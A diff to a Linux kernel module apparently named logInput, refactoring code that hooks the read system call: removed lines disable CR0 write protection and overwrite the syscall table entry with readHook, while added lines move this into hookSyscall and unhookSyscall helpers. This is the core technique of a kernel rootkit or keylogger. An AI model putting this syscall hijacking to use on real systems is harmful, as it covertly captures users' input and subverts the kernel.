@@ -9,13 +9,9 @@
 #include <linux/sched.h>
 #include <linux/kallsyms.h>
 
-#include "environmentSpecificOptions.h"
+#include "common.h"
 #include "logInput.h"
 #include "outputDevice.h"
-
-void **syscallTable = (void **) SYSCALL_TABLE;
-void (*pages_rw)(struct page *page, int numpages) = (void *) PAGES_RW;
-void (*pages_ro)(struct page *page, int numpages) = (void *) PAGES_RO;
 
 struct page *syscallPageTemp;
 
@@ -44,27 +40,10 @@ asmlinkage int readHook(int fd, void* buf, size_t nbytes)
 
 
 int __init logInput_init(void) {	
-	write_cr0 (read_cr0 () & (~ 0x10000));
-	syscallPageTemp = virt_to_page(syscallTable);
-	pages_rw(syscallPageTemp, 1);
-
-	originalRead = syscallTable[__NR_read];
-	syscallTable[__NR_read] = readHook;
-
-	write_cr0 (read_cr0 () | 0x10000);
-//	addToOutputDevice("Logging input!");
+   originalRead = hookSyscall(__NR_read, readHook);
 	return 0;
-//blah
 }
 
 void __exit logInput_exit(void) {
-	 // unimplemented
-	
-	write_cr0 (read_cr0 () & (~ 0x10000));
-	syscallPageTemp = virt_to_page(syscallTable);
-	syscallTable[__NR_read] = originalRead;
-	pages_ro(syscallPageTemp, 1);
-	write_cr0 (read_cr0 () | 0x10000);
-	printk(KERN_ALERT "MODULE EXIT\n");
-	return;
+   unhookSyscall(__NR_read, originalRead);
 }
